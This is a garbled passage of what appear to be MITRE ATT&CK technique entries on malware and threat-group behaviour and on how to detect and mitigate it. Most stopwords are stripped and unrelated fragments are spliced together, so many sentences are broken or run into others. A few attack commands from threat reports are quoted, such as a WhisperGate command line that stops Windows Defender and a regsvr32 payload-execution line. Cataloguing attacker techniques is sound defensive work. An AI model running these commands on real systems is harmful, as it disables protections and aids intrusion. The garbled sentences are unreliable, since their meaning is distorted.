Jan 2019)(Citation: IB Silence Sept 2018) [KONNI](https://attack.mitre.org/software/S0356) cmd.exe execute arbitrary commands infected host stages infection chain.(Citation: Talos Konni 2017)(Citation: Medium KONNI Jan 2020)(Citation: Malwarebytes Konni Aug 2021)  [Sidewinder](https://attack.mitre.org/groups/G0121) VBScript drop execute malware loaders.(Citation: ATT Sidewinder January 2021) [SDBbot](https://attack.mitre.org/software/S0461) collected data compromised host C2 servers.(Citation: Korean FSI TA505 2020) Monitor executed commands arguments invoke WinRM script correlate events.(Citation: Medium Detecting Lateral Movement) [GravityRAT](https://attack.mitre.org/software/S0237) steals files extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, .pdf.(Citation: Talos GravityRAT) [Explosive](https://attack.mitre.org/software/S0569) function OpenClipboard wrapper.(Citation: CheckPoint Volatile Cedar March 2015)   Monitor API calls attempt gather language victim infer geographical location host. [InvisiMole](https://attack.mitre.org/software/S0260) variation XOR cipher encrypt files exfiltration.(Citation: ESET InvisiMole June 2018) Windows Policy manage root certificates <code>Flags</code> <code>HKLM\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\ProtectedRoots</code> set 1 prevent non-administrator users root installations HKCU certificate store. (Citation: SpectorOps Code Signing Dec 2017) Monitor API calls SetWindowsHookEx SetWinEventHook functions, install hook procedure.(Citation: Hook Overview)(Citation: Volatility Detecting Hooks Sept 2012) analyzing hook chains (which hold pointers hook procedures type hook) tools(Citation: Volatility Detecting Hooks Sept 2012)(Citation: PreKageo Winhook Jul 2011)(Citation: Jay GetHooks Sept 2011) programmatically examining internal kernel structures.(Citation: Zairon Hooking Dec 2006)(Citation: EyeofRa Detecting Hooking June 2017) [FIVEHANDS](https://attack.mitre.org/software/S0618) ability decrypt payload prior execution.(Citation: FireEye FiveHands April 2021)(Citation: CISA AR21-126A FIVEHANDS 2021)(Citation: NCC Fivehands June 2021) [Ryuk](https://attack.mitre.org/software/S0446) injected remote processes encrypt files combination <code>VirtualAlloc</code>, <code>WriteProcessMemory</code>, <code>CreateRemoteThread</code>.(Citation: CrowdStrike Ryuk January 2019) [Bisonal](https://attack.mitre.org/software/S0268) MPRESS packer tools obfuscation.(Citation: Talos Bisonal Mar 2020)  disabling Windows administrative shares. [Diavol](https://attack.mitre.org/software/S0659) ARP table remote hosts scan.(Citation: Fortinet Diavol July 2021)  [Turla](https://attack.mitre.org/groups/G0010) IronPython scripts [IronNetInjector](https://attack.mitre.org/software/S0581) toolchain drop payloads.(Citation: Unit 42 IronNetInjector February 2021 ) [RainyDay](https://attack.mitre.org/software/S0629) scheduled tasks achieve persistence.(Citation: Bitdefender Naikon April 2021) [Egregor](https://attack.mitre.org/software/S0554) conduct Active Directory reconnaissance tools Sharphound [AdFind](https://attack.mitre.org/software/S0552).(Citation: Intrinsec Egregor Nov 2020) disabling restricting NTLM.(Citation: Disable NTLM Nov 2012) Monitor executed commands arguments invocation utilities determining origin purpose binary executed. [CookieMiner](https://attack.mitre.org/software/S0492) retrieved iPhone messages iTunes phone backup files.(Citation: Unit42 CookieMiner Jan 2019) [Goopy](https://attack.mitre.org/software/S0477) checked Google Updater process ensure [Goopy](https://attack.mitre.org/software/S0477) loaded properly.(Citation: Cybereason Cobalt Kitty 2017)  [Kimsuky](https://attack.mitre.org/groups/G0094) QuickZip archive stolen files exfiltration.(Citation: Talos Kimsuky Nov 2021) [JHUHUGIT](https://attack.mitre.org/software/S0044) registered service establish persistence.(Citation: ESET Sednit 1) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware SHARPKNOT overwrites deletes Master Boot Record (MBR) victim's machine possessed MBR wiper malware 2009.(Citation: US-CERT SHARPKNOT June 2018)(Citation: Novetta Blockbuster) [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), threat actors executed JavaScript code `mshta.exe`.(Citation: Cylance Dust Storm) [SysUpdate](https://attack.mitre.org/software/S0663) write configuration file <code>Software\Classes\scConfig</code> <code>HKEY_LOCAL_MACHINE</code> <code>HKEY_CURRENT_USER</code>.(Citation: Trend Micro Iron Tiger April 2021) [Clambling](https://attack.mitre.org/software/S0660) enumerate processes targeted system.(Citation: Trend Micro DRBControl February 2020) (Citation: US-CERT TA18-074A) [XCSSET](https://attack.mitre.org/software/S0658) prompts user input credentials native macOS dialog box leveraging process <code>/Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment</code>.(Citation: trendmicro xcsset xcode project 2020) [APT32](https://attack.mitre.org/groups/G0050) macros, scriptlets, VBS scripts.(Citation: Cybereason Oceanlotus 2017)(Citation: Cybereason Cobalt Kitty 2017)  [APT29](https://attack.mitre.org/groups/G0016) <code>netsh</code> configure firewall rules limited UDP outbound packets.(Citation: Deep Dive Solorigate January 2021) [KOCTOPUS](https://attack.mitre.org/software/S0669) delete created registry persistence cleanup procedure.(Citation: MalwareBytes LazyScripter Feb 2021) [BISCUIT](https://attack.mitre.org/software/S0017) command download file C2 server.(Citation: Mandiant APT1 Appendix) [APT3](https://attack.mitre.org/groups/G0022) tools compress data exfilling it.(Citation: aptsim) disabling emond removing [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) plist file. [WellMess](https://attack.mitre.org/software/S0514) identify IP address user domain target machine.(Citation: PWC WellMess July 2020)(Citation: CISA WellMess July 2020) [APT19](https://attack.mitre.org/groups/G0073) attempted users launch malicious attachments delivered spearphishing emails.(Citation: FireEye APT19) (Citation: MalwareBytes LazyScripter Feb 2021) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [InvisiMole](https://attack.mitre.org/software/S0260) samples timestomped authors setting timestamps values. [InvisiMole](https://attack.mitre.org/software/S0260) built-in command modify file times.(Citation: ESET InvisiMole June 2018) [UNC2452](https://attack.mitre.org/groups/G0118) renamed version [AdFind](https://attack.mitre.org/software/S0552) <code>sqlceip.exe</code> <code>csrss.exe</code> attempt SQL Server Telemetry Client Client Service Runtime Process, respectively.(Citation: Volexity SolarWinds)(Citation: Analyzing Solorigate Dec 2020) [Blue Mockingbird](https://attack.mitre.org/groups/G0108) executed custom-compiled XMRIG miner DLLs regsvr32.exe.(Citation: RedCanary Mockingbird 2020)	 [HTTPBrowser](https://attack.mitre.org/software/S0070) HTTPS command control.(Citation: Dell TG-3390)(Citation: ThreatStream Evasion Analysis) [ProLock](https://attack.mitre.org/software/S0654) .jpg .bmp files store payload.(Citation: IB Ransomware September 2020) [ShimRat](https://attack.mitre.org/software/S0444) delivered package includes compressed DLL shellcode payloads .dat file.(Citation: FOX-IT 2016 Mofang) [OopsIE](https://attack.mitre.org/software/S0264) compresses collected files GZipStream sending C2 server.(Citation: Unit 42 OopsIE! Feb 2018) Enable AES Kerberos encryption (or stronger encryption algorithm), RC4, possible.(Citation: AdSecurity Cracking Kerberos Dec 2015) [Aoqin Dragon](https://attack.mitre.org/groups/G1007) exploited CVE-2012-0158 CVE-2010-3333 execution targeted systems.(Citation: SentinelOne Aoqin Dragon June 2022) Limit credential overlap systems prevent damage credential compromise reduce adversary's ability perform Lateral Movement systems. [Mustang Panda](https://attack.mitre.org/groups/G0129)'s custom ORat tool WMI event consumer maintain persistence.(Citation: Secureworks BRONZE PRESIDENT December 2019) Monitor abnormal presence utilities enable proxy execution typically development, debugging, reverse engineering purposes suspicious. process monitoring monitor execution arguments developer utilities abused. Compare invocations binaries prior history arguments executed binaries determine anomalous adversarial activity. utilities software developers software development tasks, exists context, event suspicious. [Inception](https://attack.mitre.org/groups/G0100) exploited CVE-2012-0158, CVE-2014-1761, CVE-2017-11882 CVE-2018-0802 execution.(Citation: Kaspersky Cloud Atlas August 2019)(Citation: Kaspersky Cloud Atlas December 2014)(Citation: Symantec Inception Framework March 2018)(Citation: Unit 42 Inception November 2018) [HAWKBALL](https://attack.mitre.org/software/S0391) exploited Office vulnerabilities CVE-2017-11882 CVE-2018-0802 deliver payload.(Citation: FireEye HAWKBALL Jun 2019)  [FIN7](https://attack.mitre.org/groups/G0046) downloaded additional malware execute victim's machine, including PowerShell script launch shellcode retrieves additional payload.(Citation: FireEye FIN7 April 2017)(Citation: DOJ FIN7 Aug 2018) [PoetRAT](https://attack.mitre.org/software/S0428) Word documents VBScripts execute malicious activities.(Citation: Talos PoetRAT April 2020)(Citation: Talos PoetRAT October 2020) [APT3](https://attack.mitre.org/groups/G0022) tool local system.(Citation: Symantec Buckeye)(Citation: evolution pirpi) Identify malicious software taint content result audit block unknown programs application control (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) (Citation: MSTIC NOBELIUM Mar 2021)(Citation: Cybersecurity Advisory SVR TTP 2021)(Citation: MSTIC Nobelium Toolset 2021)(Citation: Secureworks IRON RITUAL Profile) (Citation: Cylance Cleaver) Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent.  [BITTER](https://attack.mitre.org/groups/G1002) executed OLE objects Equation Editor download malicious payloads.(Citation: Cisco Talos Bitter Bangladesh 2022)  Restrict administrator accounts individuals possible, privilege principles.  Prevent credential overlap systems administrator privileged accounts, network non-network platforms, servers endpoints. [DOGCALL](https://attack.mitre.org/software/S0213) encrypted single-byte XOR.(Citation: Unit 42 Nokki Oct 2018) [Patchwork](https://attack.mitre.org/groups/G0040) developed file stealer search C:\ collect files extensions. [Patchwork](https://attack.mitre.org/groups/G0040) executed script enumerate drives, store list, upload generated files C2 server.(Citation: TrendMicro Patchwork Dec 2017) [gh0st RAT](https://attack.mitre.org/software/S0032) capture victim’s screen remotely.(Citation: Nccgroup Gh0st April 2018) Monitor firmware unexpected modifications settings data. (Citation: MITRE Trustworthy Firmware Measurement) Log attempts read/write BIOS compare patching behavior. [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors [zwShell](https://attack.mitre.org/software/S0350) establish remote control connected machine browse victim file system.(Citation: McAfee Night Dragon) (Citation: Cybereason Soft Cell June 2019) [C0010](https://attack.mitre.org/campaigns/C0010), UNC3890 actors established domains appeared legitimate services entities, LinkedIn, Facebook, Office 365, Pfizer.(Citation: Mandiant UNC3890 Aug 2022) [DropBook](https://attack.mitre.org/software/S0547) checked presence Arabic language infected machine's settings.(Citation: BleepingComputer Molerats Dec 2020) Monitor third-party application logging, messaging, artifacts send phishing messages gain access victim systems. Filtering based DKIM+SPF header analysis detect email sender spoofed.(Citation: Anti Spoofing)(Citation: ACSC Email Spoofing) URL inspection email (including expanding shortened links) detect links leading malicious sites. Detonation chambers detect links automatically sites determine malicious, wait capture content user visits link. service necessary, lock critical enclaves separate WinRM infrastructure follow WinRM practices host firewalls restrict WinRM access communication to/from specific devices. (Citation: NSA Spotting) [TrickBot](https://attack.mitre.org/software/S0266) enumerate computers network devices.(Citation: Cyberreason Anchor December 2019) [Valak](https://attack.mitre.org/software/S0476) Registry code updates collect credentials.(Citation: Unit 42 Valak July 2020) [Milan](https://attack.mitre.org/software/S1015) `C:\Windows\system32\cmd.exe /c cmd /c dir c:\users\ /s 2>&1` discover local accounts.(Citation: ClearSky Siamesekitten August 2021) Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature block regsvr32.exe bypass application control. (Citation: Secure Host Baseline EMET) Identify block malicious software executed regsvr32 functionality application control (Citation: Beechey 2010) tools, Windows Defender Application Control(Citation: Windows Defender Application Control), AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) creation modification systemd service unit files administrators Linux root user users superuser privileges.  Establish centralized logging activity cloud compute infrastructure components. Monitor suspicious sequences events, mounting snapshot instance unexpected user. reduce false positives, valid change management procedures introduce identifier logged change tag header) supported cloud provider, distinguish valid, expected actions malicious ones. [C0011](https://attack.mitre.org/campaigns/C0011), [Transparent Tribe](https://attack.mitre.org/groups/G0134) malicious VBA macros lure document [Crimson](https://attack.mitre.org/software/S0115) malware installation process compromised host.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) [POLONIUM](https://attack.mitre.org/groups/G1005) compromised credentials company target downstream customers including law firm aviation company.(Citation: POLONIUM June 2022) [WhisperGate](https://attack.mitre.org/software/S0689) stage AdvancedRun.exe tool execute commands context Windows TrustedInstaller `%TEMP%\AdvancedRun.exe" /EXEFilename "C:\Windows\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run`.(Citation: Cisco Ukraine Wipers January 2022) [Squirrelwaffle](https://attack.mitre.org/software/S1030) relied users enabling malicious macros Excel Word attachments.(Citation: ZScaler Squirrelwaffle Sep 2021)(Citation: Netskope Squirrelwaffle Oct 2021) [LaZagne](https://attack.mitre.org/software/S0349) credentials databases, mail, WiFi multiple platforms.(Citation: GitHub LaZagne Dec 2018) [APT29](https://attack.mitre.org/groups/G0016) legitimate mailing service Constant Contact send phishing e-mails.
(Citation: Cybersecurity Advisory SVR TTP 2021) [WhisperGate](https://attack.mitre.org/software/S0689) download additional payloads hosted Discord channel.(Citation: Crowdstrike WhisperGate January 2022)(Citation: Unit 42 WhisperGate January 2022)(Citation: WhisperGate January 2022)(Citation: Cisco Ukraine Wipers January 2022)(Citation: Medium S2W WhisperGate January 2022) [Saint Bot](https://attack.mitre.org/software/S1018) deobfuscate strings files execution.(Citation: Malwarebytes Saint Bot April 2021) [Gold Dragon](https://attack.mitre.org/software/S0249) lists directories Desktop, program files, user’s accessed files.(Citation: McAfee Gold Dragon) [Cobalt Strike](https://attack.mitre.org/software/S0154) deobfuscate shellcode rolling XOR decrypt metadata Beacon sessions.(Citation: Talos Cobalt Strike September 2020)(Citation: Cobalt Strike Manual 4.3 November 2020) [FIN6](https://attack.mitre.org/groups/G0037) created Windows services execute encoded PowerShell commands.(Citation: FireEye FIN6 Apr 2019) Avoid PowerShell profiles needed. <code>-No Profile</code> flag executing PowerShell scripts remotely prevent local profiles scripts executed.  [FinFisher](https://attack.mitre.org/software/S0182) junk code functions effort confuse disassembly programs.(Citation: FinFisher Citation)(Citation: FinFisher March 2018) [GALLIUM](https://attack.mitre.org/groups/G0093) <code>ipconfig /all</code> victim network configuration. modified version [NBTscan](https://attack.mitre.org/software/S0590) identify NetBIOS servers.(Citation: Cybereason Soft Cell June 2019) [Shark](https://attack.mitre.org/software/S1019) extract decrypt downloaded .zip files.(Citation: ClearSky Siamesekitten August 2021) eliminate path interception weaknesses program configuration files, scripts, PATH environment variable, services, shortcuts surrounding PATH variables quotation marks functions (Citation: CreateProcess). aware search Windows executing loading binaries qualified paths (Citation: MSDN DLL Security). 

Clean Windows Registry software uninstalled avoid legitimate binaries. Periodically search correct report path interception weaknesses systems introduced custom tools report software insecure path configurations. (Citation: Kanthak Sentinel) sudoers file strictly edited passwords required users spawn risky processes users privilege. [DealersChoice](https://attack.mitre.org/software/S0243) leverages vulnerable versions Flash perform execution.(Citation: Sofacy DealersChoice) [KillDisk](https://attack.mitre.org/software/S0607) overwrites sector Master Boot Record “0x00”.(Citation: Trend Micro KillDisk 1) [meek](https://attack.mitre.org/software/S0175) Domain Fronting disguise destination network traffic server hosted Content Delivery Network (CDN) intended destination. [Wingbird](https://attack.mitre.org/software/S0176) checks presence Bitdefender security software.(Citation: SIR 21) [HTTPBrowser](https://attack.mitre.org/software/S0070) deletes original installer file installation complete.(Citation: ZScaler Hacking Team) Monitor settings unexpected modifications user accounts, deletions malicious user attributes (credentials, status, etc.). (Citation: Trend Micro Iron Tiger April 2021)(Citation: Trend Micro DRBControl February 2020)(Citation: Profero APT27 December 2020) [Confucius](https://attack.mitre.org/groups/G0142) exfiltrated stolen files C2 server.(Citation: TrendMicro Confucius APT Aug 2021) [Trojan.Karagany](https://attack.mitre.org/software/S0094) dump passwords save <code>\ProgramData\Mail\MailAg\pwds.txt</code>.(Citation: Symantec Dragonfly) [Vasport](https://attack.mitre.org/software/S0207) capable tunneling proxy.(Citation: Symantec Vasport 2012) LKMs typically loaded <code>/lib/modules</code> extension .ko ("kernel object") version 2.6 Linux kernel. (Citation: Wikipedia Loadable Kernel Module) [macOS.OSAMiner](https://attack.mitre.org/software/S1048) `launchctl` restart [Launch Agent](https://attack.mitre.org/techniques/T1543/001).(Citation: SentinelLabs reversing run-only applescripts 2021) [Revenge RAT](https://attack.mitre.org/software/S0379) cmd.exe execute commands scripts victim's machine.(Citation: Cofense RevengeRAT Feb 2019) Monitor settings unexpected modifications user accounts, deletions malicious user attributes (credentials, status, etc.).  [Bisonal](https://attack.mitre.org/software/S0268) exfiltrated data URL C2 channel.(Citation: Talos Bisonal Mar 2020)  [IronNetInjector](https://attack.mitre.org/software/S0581) ability decrypt embedded .NET payloads.(Citation: Unit 42 IronNetInjector February 2021 ) Limit user accounts allowed login SSH. proxies enforce external network communication policy prevents unauthorized external services. Monitor scheduled jobs attempt manipulate features artifacts legitimate benign users security tools. PowerShell necessary, restrict PowerShell execution policy administrators. aware methods bypassing PowerShell execution policy, depending environment configuration. (Citation: Netspi PowerShell Execution Policy Bypass)  [Winnti Windows](https://attack.mitre.org/software/S0141) delete DLLs components compromised host.(Citation: Novetta Winnti April 2015) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. Automatically events log server data repository prevent conditions adversary locate manipulate data local system. possible, minimize time delay event reporting avoid prolonged storage local system. [Machete](https://attack.mitre.org/groups/G0095)'s [Machete](https://attack.mitre.org/software/S0409) MSI installer masqueraded legitimate Adobe Acrobat Reader installer.(Citation: 360 Machete Sep 2020) [Spark](https://attack.mitre.org/software/S0543) custom XOR algorithm decrypt payload.(Citation: Unit42 Molerat Mar 2020)  [QuasarRAT](https://attack.mitre.org/software/S0262) launch remote execute commands victim’s machine.(Citation: GitHub QuasarRAT)(Citation: CISA AR18-352A Quasar RAT December 2018) [RTM](https://attack.mitre.org/software/S0148) initiated connections external domains HTTPS.(Citation: Unit42 Redaman January 2019)	 [SQLRat](https://attack.mitre.org/software/S0390) character insertion obfuscation technique, script Chinese characters.(Citation: Flashpoint FIN 7 March 2019) [RunningRAT](https://attack.mitre.org/software/S0253) gathers OS version, logical drives information, processor information, volume information.(Citation: McAfee Gold Dragon) [FIN6](https://attack.mitre.org/groups/G0037) publicly tools (including Microsoft's built-in SQL querying tool, osql.exe) map internal network conduct reconnaissance Active Directory, Structured Query Language (SQL) servers, NetBIOS.(Citation: FireEye FIN6 April 2016) [Revenge RAT](https://attack.mitre.org/software/S0379) PowerShell command <code>Reflection.Assembly</code> load memory aid execution.(Citation: Cofense RevengeRAT Feb 2019) Follow practices network firewall configurations ports traffic enter exit network.(Citation: TechNet Firewall Design) [APT33](https://attack.mitre.org/groups/G0064) SniffPass collect credentials sniffing network traffic.(Citation: Symantec Elfin Mar 2019) [iKitten](https://attack.mitre.org/software/S0278) saves leading "." hidden users default.(Citation: objsee mac malware 2017) Monitor processes inject malicious code hijacked processes evade process-based defenses elevate privileges. [NOKKI](https://attack.mitre.org/software/S0353) rundll32 execution.(Citation: Unit 42 NOKKI Sept 2018) [APT29](https://attack.mitre.org/groups/G0016) installed shells exploited Exchange servers.(Citation: Cybersecurity Advisory SVR TTP 2021) [ISMInjector](https://attack.mitre.org/software/S0189) hollows newly created process RegASM.exe injects payload hollowed process.(Citation: OilRig Delivery Oct 2017) [Bandook](https://attack.mitre.org/software/S0234) command public IP address system.(Citation: CheckPoint Bandook Nov 2020)  inspect HTTPS traffic, captures analyzed connections Domain Fronting. (Citation: Netscout Stolen Pencil Dec 2018) [PyDCrypt](https://attack.mitre.org/software/S1032) attempted execute PowerShell.(Citation: Checkpoint MosesStaff Nov 2021) Monitoring Windows API calls indicative types code injection generate data defense collected specific circumstances bad sequences calls, benign API functions common difficult distinguish malicious behavior. Windows API calls <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, modify memory process, <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, technique.(Citation: Elastic Process Injection July 2017) [Seasalt](https://attack.mitre.org/software/S0345) creates Registry entry ensure infection reboot <code>HKLM\Software\Microsoft\Windows\currentVersion\Run</code>.(Citation: McAfee Oceansalt Oct 2018) (Citation: Analyzing Solorigate Dec 2020)(Citation: CrowdStrike StellarParticle January 2022)(Citation: ESET T3 Threat Report 2021) [OilRig](https://attack.mitre.org/groups/G0049) <code>whoami</code> victim.(Citation: Palo Alto OilRig 2016)(Citation: Palo Alto OilRig Oct 2016)(Citation: Check APT34 April 2021) [Comnie](https://attack.mitre.org/software/S0244) collects hostname victim machine.(Citation: Palo Alto Comnie) Monitor newly constructed files manipulate external outcomes hide activity [RainyDay](https://attack.mitre.org/software/S0629) TCP C2 communications.(Citation: Bitdefender Naikon April 2021) [KONNI](https://attack.mitre.org/software/S0356) delivered spearphishing campaigns malicious Word document.(Citation: Malwarebytes Konni Aug 2021) [Lazarus Group](https://attack.mitre.org/groups/G0032) acquired domains campaigns distribution C2 channels.(Citation: CISA AppleJeus Feb 2021)(Citation: ESET Lazarus Jun 2020)(Citation: Google TAG Lazarus Jan 2021) [QuietSieve](https://attack.mitre.org/software/S0686) collect files compromised host.(Citation: Actinium February 2022) Monitor items written Registry files written disk. correlate browser extension installation. [FatDuke](https://attack.mitre.org/software/S0512) execute rundll32.(Citation: ESET Dukes October 2019) [JCry](https://attack.mitre.org/software/S0389) <code>cmd.exe</code> launch PowerShell.(Citation: Carbon Black JCry 2019)	 (Citation: Symantec Sowbug Nov 2017) Monitor file commands files created leading ".” Windows command-line attrib.exe add hidden attribute. [Explosive](https://attack.mitre.org/software/S0569) function OpenClipboard wrapper.(Citation: CheckPoint Volatile Cedar March 2015)  [Molerats](https://attack.mitre.org/groups/G0021) PowerShell implants target machines.(Citation: Kaspersky MoleRATs April 2019) [RTM](https://attack.mitre.org/software/S0148) runs core DLL file rundll32.exe.(Citation: ESET RTM Feb 2017)(Citation: Unit42 Redaman January 2019) Data captured [RawPOS](https://attack.mitre.org/software/S0169) temporary file directory named "memdump".(Citation: Kroll RawPOS Jan 2017) Monitor logged domain (DNS) data compromise third-party infrastructure targeting. Detection efforts focused stages adversary lifecycle, Command Control. [XCSSET](https://attack.mitre.org/software/S0658) zero-day exploit ssh launchdaemon elevate privileges bypass SIP.(Citation: trendmicro xcsset xcode project 2020) Ensure proper permissions prevent adversary access privileged accounts perform actions [Avaddon](https://attack.mitre.org/software/S0640) wmic.exe delete shadow copies.(Citation: Hornet Security Avaddon June 2020) [FunnyDream](https://attack.mitre.org/software/S1044) ability clean traces malware deployment.(Citation: Bitdefender FunnyDream Campaign November 2020) [Heyoka Backdoor](https://attack.mitre.org/software/S1027) establish persistence auto start function including `EverNoteTrayUService`.(Citation: SentinelOne Aoqin Dragon June 2022) [WarzoneRAT](https://attack.mitre.org/software/S0670) ability inject malicious DLLs specific process privilege escalation.(Citation: Check Warzone Feb 2020) [SideCopy](https://attack.mitre.org/groups/G1008) malicious loader DLL file execute `credwiz.exe` process side-load malicious payload `Duser.dll`.(Citation: MalwareBytes SideCopy Dec 2021) [RTM](https://attack.mitre.org/software/S0148) Port 44443 VNC module.(Citation: ESET RTM Feb 2017) [Bad Rabbit](https://attack.mitre.org/software/S0606) Windows API calls.(Citation: ESET Bad Rabbit) [gh0st RAT](https://attack.mitre.org/software/S0032) operators dynamic DNS mask true location C2 rapidly changing IP addresses.(Citation: Gh0stRAT ATT March 2019) [NavRAT](https://attack.mitre.org/software/S0247) creates Registry key ensure file executed reboot establish persistence.(Citation: Talos NavRAT 2018) Block unknown devices accessories endpoint security configuration monitoring agent. Ensure privilege principles applied Identity Access Management (IAM) security policies.(Citation: Expel Evil AWS) [EvilBunny](https://attack.mitre.org/software/S0396) time measurements 3 APIs performing sleep operations check abort malware running sandbox.(Citation: Cyphort EvilBunny Dec 2014) (Citation: Google EXOTIC LILY March 2022) Properly configure firewalls proxies limit outgoing traffic ports proper network gateway systems. ensure hosts provisioned communicate authorized interfaces. [APT38](https://attack.mitre.org/groups/G0082) Trojan called KEYLIME collect data clipboard.(Citation: FireEye APT38 Oct 2018) [DustySky](https://attack.mitre.org/software/S0062) hard-coded domains C2 servers; respond, second.(Citation: DustySky) Periodically check integrity image ensure modified. (Citation: Cisco IOS Software Integrity Assurance - Image File Integrity) (Citation: Cisco IOS Software Integrity Assurance - Image File Verification) (Citation: Cisco IOS Software Integrity Assurance - Change Control)  [Kazuar](https://attack.mitre.org/software/S0265) captures screenshots victim’s screen.(Citation: Unit 42 Kazuar 2017) Limit USB devices removable media network. [HermeticWizard](https://attack.mitre.org/software/S0698) `regsvr32.exe /s /i` execute malicious payloads.(Citation: ESET Hermetic Wizard March 2022) [EvilGrab](https://attack.mitre.org/software/S0152) capability capture screenshots.(Citation: PWC Cloud Hopper Technical Annex April 2017) (Citation: ESET Carbon Mar 2017)(Citation: Secureworks IRON HUNTER Profile) Monitor unusual kernel driver installation activity configure settings automatically execute program boot logon maintain persistence gain higher-level privileges compromised systems. [Indrik Spider](https://attack.mitre.org/groups/G0119) PowerView enumerate Windows Server, Windows Server 2003, Windows 7 instances Active Directory database.(Citation: Symantec WastedLocker June 2020) [AppleSeed](https://attack.mitre.org/software/S0622) ability search .txt, .ppt, .hwp, .pdf, .doc files directories.(Citation: Malwarebytes Kimsuky June 2021) [Chaes](https://attack.mitre.org/software/S0631) search hijacking load malicious DLL.(Citation: Cybereason Chaes Nov 2020) StartupItems deprecated, preventing users writing <code>/Library/StartupItems</code> directory prevent startup items registered. [Remexi](https://attack.mitre.org/software/S0375) command capture active windows machine retrieve window titles.(Citation: Securelist Remexi Jan 2019) [Remsec](https://attack.mitre.org/software/S0125) schedules execution modules creating scheduler task.(Citation: Kaspersky ProjectSauron Technical Analysis) [njRAT](https://attack.mitre.org/software/S0385) create, delete, modify Registry key value.(Citation: Fidelis njRAT June 2013)(Citation: Trend Micro njRAT 2018) [Mori](https://attack.mitre.org/software/S1047) write data `HKLM\Software\NFC\IPA` `HKLM\Software\NFC\` delete Registry values.(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: CYBERCOM Iranian Intel Cyber January 2022) Train users identify social engineering techniques spearphishing emails deliver malicious documents. [Threat Group-3390](https://attack.mitre.org/groups/G0027) <code>net user</code> conduct internal discovery systems.(Citation: SecureWorks BRONZE UNION June 2017) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors batch scripts perform reconnaissance.(Citation: Cybereason OperationCuckooBees 2022) Periodically baseline instances identify malicious modifications additions. [yty](https://attack.mitre.org/software/S0248) keylogger plugin gather keystrokes.(Citation: ASERT Donot March 2018) [PROMETHIUM](https://attack.mitre.org/groups/G0056) signed code self-signed certificates.(Citation: Bitdefender StrongPity June 2020) [Sidewinder](https://attack.mitre.org/groups/G0121) tools collect name, OS version, installed hotfixes, memory processor compromised host.(Citation: ATT Sidewinder January 2021)(Citation: Rewterz Sidewinder COVID-19 June 2020) [Turian](https://attack.mitre.org/software/S0647) store copied files specific directory prior exfiltration.(Citation: ESET BackdoorDiplomacy Jun 2021) [Egregor](https://attack.mitre.org/software/S0554) disabled Windows Defender evade protections.(Citation: Intrinsec Egregor Nov 2020) [RCSession](https://attack.mitre.org/software/S0662) compress obfuscate strings evade detection compromised host.(Citation: Trend Micro DRBControl February 2020) Monitor LSA secrets stored registry <code>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</code> accessed (Citation: Cybereason Soft Cell June 2019)(Citation: GALLIUM December 2019) adversary administrator level access local technique; restrict users accounts privileges require.   [StoneDrill](https://attack.mitre.org/software/S0380) wipe master boot record infected computer.(Citation: Symantec Elfin Mar 2019) [LaZagne](https://attack.mitre.org/software/S0349) credentials macOS Keychains.(Citation: GitHub LaZagne Dec 2018)	 [TinyTurla](https://attack.mitre.org/software/S0668) query Registry configuration information.(Citation: Talos TinyTurla September 2021) Monitor constructed systemd services repeatedly execute malicious payloads persistence. endpoint security solutions configured block types process injection based common sequences behavior occur injection process.  [TA505](https://attack.mitre.org/groups/G0092) downloaded additional malware execute victim systems.(Citation: Cybereason TA505 April 2019)(Citation: Deep Instinct TA505 Apr 2019)(Citation: ProofPoint SettingContent-ms July 2018) [HAWKBALL](https://attack.mitre.org/software/S0391) created cmd.exe reverse shell, executed commands, uploaded output command line.(Citation: FireEye HAWKBALL Jun 2019) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware modifies Windows firewall incoming connections disable [netsh](https://attack.mitre.org/software/S0108). (Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Loaders)(Citation: Novetta Blockbuster Tools) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors `tasklist` command search backdoors.(Citation: FoxIT Wocao December 2019) (Citation: iSIGHT Sandworm 2014)(Citation: F-Secure BlackEnergy 2014)(Citation: District Court Indictment GRU Unit 74455 October 2020)(Citation: NCSC Olympic Attacks October 2020)(Citation: Secureworks IRON VIKING ) Monitor network traffic originating unknown/unexpected hardware devices. Local network traffic metadata (such source MAC addressing) usage network management protocols DHCP helpful identifying hardware. [Rclone](https://attack.mitre.org/software/S1040) "chunker" overlay supports splitting files chunks upload circumvent size limits.(Citation: Rclone)(Citation: DFIR Conti Bazar Nov 2021) [TA505](https://attack.mitre.org/groups/G0092) malware [Azorult](https://attack.mitre.org/software/S0344) [Cobalt Strike](https://attack.mitre.org/software/S0154) operations.(Citation: NCC TA505) [Magic Hound](https://attack.mitre.org/groups/G0059) malware communicated C2 server TCP port 4443 HTTP.(Citation: Unit 42 Magic Hound Feb 2017) Monitor network traffic originating unknown/unexpected hardware devices. [Ke3chang](https://attack.mitre.org/groups/G0004) performs discovery permission <code>net /domain</code>.(Citation: Mandiant Operation 